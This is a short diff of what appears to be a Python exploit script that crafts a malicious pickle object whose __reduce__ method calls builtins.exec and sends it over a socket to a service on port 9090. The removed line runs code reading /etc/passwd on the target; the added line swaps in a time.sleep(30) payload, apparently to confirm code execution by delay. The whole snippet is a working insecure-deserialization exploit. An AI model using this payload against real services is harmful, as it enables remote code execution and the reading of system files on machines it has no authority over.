@@ -7,7 +7,8 @@ PORT = 9090
 
 class Pickle(object):
     def __reduce__(self):
-        return (builtins.exec, ("with open('/etc/passwd','r') as r: print(r.readlines())",))
+        import os
+        return (builtins.exec, ("import time; time.sleep(30)",))
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
     sock.connect((HOST,PORT))
